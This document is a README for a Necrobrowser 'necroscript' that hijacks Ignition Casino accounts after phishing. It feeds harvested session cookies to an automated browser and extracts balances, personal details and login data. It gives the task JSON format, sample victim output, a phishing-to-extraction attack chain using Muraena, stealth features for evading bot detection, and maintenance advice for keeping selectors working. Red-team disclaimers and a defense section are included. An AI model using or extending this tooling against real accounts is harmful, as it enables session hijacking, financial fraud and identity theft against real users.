# Ignition Casino Necroscript

## Overview

Simplified post-phishing session hijacking script for Ignition Casino (ignitioncasino.ooo) accounts. This script extracts essential account information following successful credential harvesting.

**Target Platform**: Ignition Casino (online casino/poker/sports betting)  
**Primary Use**: Red team assessments, penetration testing  
**Risk Level**: HIGH

---

## Available Function

### GetAccountInfo

**Purpose**: Extract account balance, personal details, and login information

**Capabilities**:
- Extract account balance (poker, casino, sports wallets)
- Capture personal information (name, email, phone, address)
- Extract login credentials (email/username)
- Document session cookies

**Example Usage**:
```json
{
  "name": "victim-email@example.com",
  "task": {
    "type": "ignitioncasino",
    "name": ["GetAccountInfo"],
    "params": {}
  },
  "cookie": [
    {
      "name": "session_id",
      "value": "harvested_session_token",
      "domain": ".ignitioncasino.ooo",
      "path": "/",
      "httpOnly": true,
      "secure": true
    }
  ]
}
```

**Output**:
```json
{
  "balance": {
    "poker": "1234.50",
    "casino": "567.89",
    "total": "1802.39"
  },
  "personalInfo": {
    "email": "victim@example.com",
    "name": "John Doe",
    "phone": "(555) 123-4567",
    "address": "123 Main St"
  },
  "loginDetails": {
    "loginEmail": "victim@example.com",
    "accountId": "12345678",
    "sessionCookies": [...]
  },
  "extractedAt": "2026-02-04T10:30:00.000Z"
}
```

---

## Technical Details

### Session Requirements

**Required Cookies**:
- Session token (varies by implementation)
- Authentication cookies
- CSRF tokens if applicable

**Cookie Domains**:
- `.ignitioncasino.ooo`
- `www.ignitioncasino.ooo`

### Error Handling

The function includes:
- Try/catch blocks for graceful failure
- Screenshot capture on errors
- Redis status updates
- Detailed console logging
- Multiple selector fallbacks for UI changes

### Stealth Features

- Realistic delays between actions
- Multiple selector fallbacks
- Puppeteer Stealth plugin integration
- Incognito browser contexts

---

## Detection & Defense

### Detection Indicators

**User-Level**:
- Unusual login locations/times
- Rapid page navigation
- Automated access patterns

**Technical**:
- Puppeteer/Selenium signatures
- Consistent timing between actions
- Unusual API access patterns

### Defensive Measures

**For Users**:
1. Enable 2FA/MFA on account
2. Use strong, unique passwords
3. Monitor account activity regularly
4. Enable email notifications for logins

**For Platform**:
1. Implement bot detection (reCAPTCHA, hCaptcha)
2. Rate limit sensitive operations
3. Require re-authentication for sensitive actions
4. Implement device fingerprinting
5. Monitor for automation signatures
6. Alert on unusual access patterns

---

## Legal & Ethical Considerations

### Authorized Use Only

This script is designed for:
- **Authorized penetration testing** with written permission
- **Red team assessments** within scope
- **Security research** in controlled environments
- **Educational purposes** with proper disclaimers

### Illegal Use

Unauthorized use constitutes:
- **Computer Fraud and Abuse Act (CFAA)** violations
- **Identity theft** (18 U.S.C. § 1028)
- **Unauthorized access** under state/federal law

**Penalties**: Up to 10 years imprisonment + fines

---

## Example Attack Chain

```
1. Phishing Campaign (Muraena)
   ↓
2. Harvest Session Cookies
   ↓
3. Submit to Necrobrowser
   POST /instrument with cookies + GetAccountInfo
   ↓
4. Data Extracted
   - Balance: $1,802.39
   - Email: victim@example.com
   - Phone: (555) 123-4567
   - Account ID: 12345678
```

---

## Testing Recommendations

### Safe Testing Approach

1. **Use Test Accounts**: Create dedicated test accounts
2. **Monitor Closely**: Watch browser in GUI mode during development
3. **Document**: Keep detailed logs of all testing activities

### Validation Checklist

- [ ] Session cookies properly formatted
- [ ] Target URLs accessible
- [ ] Selectors match current site version
- [ ] Error handling works correctly
- [ ] Screenshots captured successfully
- [ ] Data stored in Redis
- [ ] No unintended actions taken

---

## Troubleshooting

### Common Issues

**Issue**: "Session not authenticated"
- **Cause**: Invalid or expired cookies
- **Solution**: Re-harvest fresh session cookies

**Issue**: Selectors not found
- **Cause**: Site UI has changed
- **Solution**: Update selectors in necrotask.js

**Issue**: Timeout errors
- **Cause**: Slow page loads or network issues
- **Solution**: Increase timeout values

**Issue**: No data extracted
- **Cause**: Account page structure different than expected
- **Solution**: Check screenshots, update extraction logic

---

## Maintenance

### Regular Updates Needed

1. **Selector Updates**: Site UI changes require selector updates
2. **URL Changes**: Monitor for URL structure changes
3. **New Features**: Adapt to new platform features
4. **Security Updates**: Adapt to new anti-bot measures

---

## Disclaimer

This tool is provided for authorized security testing and research purposes only. Unauthorized access to computer systems is illegal. The authors and contributors assume no liability for misuse of this software. Users are solely responsible for ensuring they have proper authorization before using these tools.

**USE AT YOUR OWN RISK**
